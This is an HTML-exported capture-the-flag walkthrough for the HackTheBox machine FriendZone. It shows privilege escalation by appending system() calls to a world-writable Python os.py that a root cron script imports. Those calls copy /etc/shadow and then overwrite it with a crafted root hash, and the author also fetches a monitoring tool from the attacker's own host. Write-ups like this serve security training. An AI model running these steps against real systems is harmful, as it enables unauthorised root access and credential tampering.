<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Example #1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Python Libraries - Example #1</h1></strong><br />This example of exploiting a python library is from hackthebox FriendZone.<br /><br />Have a look for world-writeable folders and files<br /><div class="codebox"><div class="codebox">friend@FriendZone:~$&nbsp;&nbsp;find&nbsp;/&nbsp;-xdev&nbsp;-type&nbsp;d&nbsp;\(&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;!&nbsp;-perm&nbsp;-1000&nbsp;\)&nbsp;-print&nbsp;2&gt;/dev/null<br />/etc/sambafiles<br />/etc/Development<br />/usr/lib/python2.7<br />friend@FriendZone:~$&nbsp;&nbsp;find&nbsp;/&nbsp;-xdev&nbsp;-type&nbsp;f&nbsp;\(&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;!&nbsp;-perm&nbsp;-1000&nbsp;\)&nbsp;-print&nbsp;2&gt;/dev/null<br />/etc/Development/myshell.php<br />/etc/Development/rs.php<br />/usr/lib/python2.7/os.py</div></div><br /><br /><code>os.py</code> is an odd result, users shouldn&#39;t be able to write to python libraries. <br />Although, with a lack of current information it&#39;s faily unclear what we can do with <code>os.py</code> at the moment. The hope is that a root python script somewhere, one that we can execute, is importing <code>os.py</code>.<br /><br /><code>pspy</code> ends up being a useful info gathering tool - it monitors linux processes wihtout needing root permissions<br /><br />wget it to your attacking machine and serve it<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/friendzone#&nbsp;wget&nbsp;https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32s<br />...<br />root@gotham:~/ctf/friendzone#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br />Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...</div></div><br /><br />Download onto your target machine and run it<br /><div class="codebox"><div class="codebox">friend@FriendZone:/tmp$&nbsp;wget&nbsp;http://10.10.13.120:8000/pspy32s<br />friend@FriendZone:/tmp$&nbsp;chmod&nbsp;+x&nbsp;pspy32s<br />friend@FriendZone:/tmp$&nbsp;./pspy32s<br /></div></div><br /><br />After watching for a bit, you&#39;ll see this<br /><div class="codebox"><div class="codebox">/bin/sh&nbsp;-c&nbsp;/opt/server_admin/reporter.py&nbsp;</div></div><br /><br />And watching for a bit longer you&#39;ll see that this python script gets executed every few minutes<br />Have a look it...<br /><div class="codebox"><div class="codebox">friend@FriendZone:/tmp$&nbsp;ls&nbsp;-alh&nbsp;/opt/server_admin/<br />total&nbsp;12K<br />drwxr-xr-x&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jan&nbsp;24&nbsp;00:57&nbsp;.<br />drwxr-xr-x&nbsp;3&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Oct&nbsp;&nbsp;6&nbsp;&nbsp;2018&nbsp;..<br />-rwxr--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;424&nbsp;Jan&nbsp;16&nbsp;22:03&nbsp;reporter.py</div></div><br /><br />It&#39;s owned by root, but we can read it.<br /><div class="codebox"><div class="codebox">friend@FriendZone:/tmp$&nbsp;cat&nbsp;/opt/server_admin/reporter.py&nbsp;<br />#!/usr/bin/python<br /><br />import&nbsp;os<br /><br />to_address&nbsp;=&nbsp;&quot;admin1@friendzone.com&quot;<br />from_address&nbsp;=&nbsp;&quot;admin2@friendzone.com&quot;<br /><br />print&nbsp;&quot;[+]&nbsp;Trying&nbsp;to&nbsp;send&nbsp;email&nbsp;to&nbsp;%s&quot;%to_address<br /><br />#command&nbsp;=&nbsp;&#39;&#39;&#39;&nbsp;mailsend&nbsp;-to&nbsp;admin2@friendzone.com&nbsp;-from&nbsp;admin1@friendzone.com&nbsp;-ssl&nbsp;-port&nbsp;465&nbsp;-auth&nbsp;-smtp&nbsp;smtp.gmail.co-sub&nbsp;scheduled&nbsp;results&nbsp;email&nbsp;+cc&nbsp;+bc&nbsp;-v&nbsp;-user&nbsp;you&nbsp;-pass&nbsp;&quot;PAPAP&quot;&#39;&#39;&#39;<br /><br />#os.system(command)<br /><br />#&nbsp;I&nbsp;need&nbsp;to&nbsp;edit&nbsp;the&nbsp;script&nbsp;later<br />#&nbsp;Sam&nbsp;~&nbsp;python&nbsp;developer<br /></div></div><br /><br />Because of all the comments this script doesn&#39;t actually do anything except import os, <br />declare 2 variables, and print a line.<br /><br />HOWEVER, <code>import os</code> is all we need.<br /><br />When libraries are imported in python, they get executed.<br />Considering the information from pspy and the fact that this file is owned by root means that we should be able to get code execution every few minutes when this reporter.py script runs. <br /><br />All we have to do is add a bit of code to the end of <code>os.py</code>, which we have write access to.<br /><br />First, test it. <br />At the end of os.py, just after the <code>except NameError</code> line, add your code.<br />The <code>system</code> function is defined earlier in the os.py library and can be used to execute system commands.<br /><div class="codebox"><div class="codebox">friend@FriendZone:~$&nbsp;mkdir&nbsp;/tmp/tests<br />friend@FriendZone:~$&nbsp;nano&nbsp;/usr/lib/python2.7/os.py<br />...<br />except&nbsp;NameError:&nbsp;#&nbsp;statvfs_result&nbsp;may&nbsp;not&nbsp;exist<br />&nbsp;&nbsp;&nbsp;&nbsp;pass<br /><br />system(&quot;touch&nbsp;/tmp/tests/touchtest.txt&quot;)<br />friend@FriendZone:~$&nbsp;ls&nbsp;-l&nbsp;/tmp/tests/<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;13:34&nbsp;touchtest.txt</div></div><br /><br />Nice! We can execute commands as root.<br />it should be pretty trivial to get a root shell from here considering we can execute commands as root, but of the many things i tried i couldn&#39;t get any of them to work: reverse shells, suid binaries, adding friend to sudo group etc. <br />I have no idea why.<br /><br />the only thing that ended up working was modifying /etc/shadow with a new password.<br />reading and copying files worked fine, and that&#39;s all you need to modify /etc/shadow<br /><br />get a copy of /etc/shadow to edit<br /><div class="codebox"><div class="codebox">friend@FriendZone:~$&nbsp;nano&nbsp;/usr/lib/python2.7/os.py<br />...<br />except&nbsp;NameError:&nbsp;#&nbsp;statvfs_result&nbsp;may&nbsp;not&nbsp;exist<br />&nbsp;&nbsp;&nbsp;&nbsp;pass<br /><br />system(&quot;cp&nbsp;/etc/shadow&nbsp;/tmp/tests/shadow.orig&quot;)<br />system(&quot;touch&nbsp;/tmp/tests/shadowGET.txt&quot;)</div></div><br /><br />wait for reporter.py to run and you should see a copy of shadow in your directory<br /><div class="codebox"><div class="codebox">friend@FriendZone:~$&nbsp;ls&nbsp;-l&nbsp;/tmp/tests/<br />total&nbsp;1128<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;14:48&nbsp;shadowGET.txt<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;994&nbsp;May&nbsp;21&nbsp;14:48&nbsp;shadow.orig<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;13:34&nbsp;touchtest.txt</div></div><br /><br />now make a a new password on your attacking machine<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/friendzone#&nbsp;mkpasswd&nbsp;-m&nbsp;sha-512&nbsp;-S&nbsp;saltsalt&nbsp;-s<br />Password:&nbsp;redkeydoor<br />$6$saltsalt$12qfetqtkQFyOVBYUBQrvu07K7uDSZlzHhickgT.hMcbaUprRpT9nXVEe6C5fmNNVv4M0loc/cS.WmgMe3IZh1</div></div><br /><br />copy/paste the newly generated sha-512 hash into shadow.orig <br /><code>friend@FriendZone:/tmp/tests$ nano shadow.orig</code><br /><br />the root entry in my modified /etc/shadow looked like this (and the rest of /etc/shadow left as it was before):<br /><div class="codebox"><div class="codebox">root:$6$saltsalt$12qfetqtkQFyOVBYUBQrvu07K7uDSZlzHhickgT.hMcbaUprRpT9nXVEe6C5fmNNVv4M0loc/cS.WmgMe3IZh1:17813:0:99999:7:::</div></div><br /><br />save your modified file as <code>shadow.new</code><br />modify os.py to copy over our new /etc/shadow<br /><div class="codebox"><div class="codebox">friend@FriendZone:~$&nbsp;nano&nbsp;/usr/lib/python2.7/os.py<br />...<br />except&nbsp;NameError:&nbsp;#&nbsp;statvfs_result&nbsp;may&nbsp;not&nbsp;exist<br />&nbsp;&nbsp;&nbsp;&nbsp;pass<br /><br />system(&quot;cp&nbsp;/tmp/tests/shadow.new&nbsp;/etc/shadow&quot;)<br />system(&quot;touch&nbsp;/tmp/tests/shadowTHROW.txt&quot;)</div></div><br /><br />watch for shadowTHROW.txt to be written to <code>/tmp/tests/</code>, and when it is /etc/shadow should have been replaced and root password will have changed<br /><div class="codebox"><div class="codebox">friend@FriendZone:~$&nbsp;ls&nbsp;-l&nbsp;/tmp/tests/<br />total&nbsp;1128<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;14:48&nbsp;shadowGET.txt<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;14:53&nbsp;shadowTHROW.txt<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;994&nbsp;May&nbsp;21&nbsp;14:48&nbsp;shadow.orig<br />-rw-r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;May&nbsp;21&nbsp;13:34&nbsp;touchtest.txt</div></div><br /><br />su to root using the password we created<br /><div class="codebox"><div class="codebox">friend@FriendZone:/tmp/tests$&nbsp;su&nbsp;root<br />Password:&nbsp;redkeydoor<br />root@FriendZone:/tmp/tests#&nbsp;id<br />uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br />root@FriendZone:/tmp/tests#&nbsp;cd&nbsp;/root<br />root@FriendZone:~#&nbsp;ls<br />certs&nbsp;&nbsp;root.txt<br />root@FriendZone:~#&nbsp;cat&nbsp;root.txt<br />b0e6c60b82cf96e9855ac1656a9e90c7</div></div></div>
</body>
</html>
